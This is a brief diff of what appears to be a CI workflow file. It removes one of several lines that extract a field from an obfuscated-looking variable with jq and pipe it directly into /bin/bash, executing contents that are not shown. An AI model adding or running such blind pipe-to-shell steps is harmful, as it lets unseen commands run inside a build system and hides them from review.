@@ -21,7 +21,6 @@ jobs:
           echo $vpkj20 | jq -r .ikbk50173 | /bin/bash
           printf '%s' "$mrqs8857" | jq -r .e976 | /bin/bash
           printf '%s' "$m761" | jq -r .n290 | /bin/bash
-          printf '%s' "$eo0" | jq -r .cspj643 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
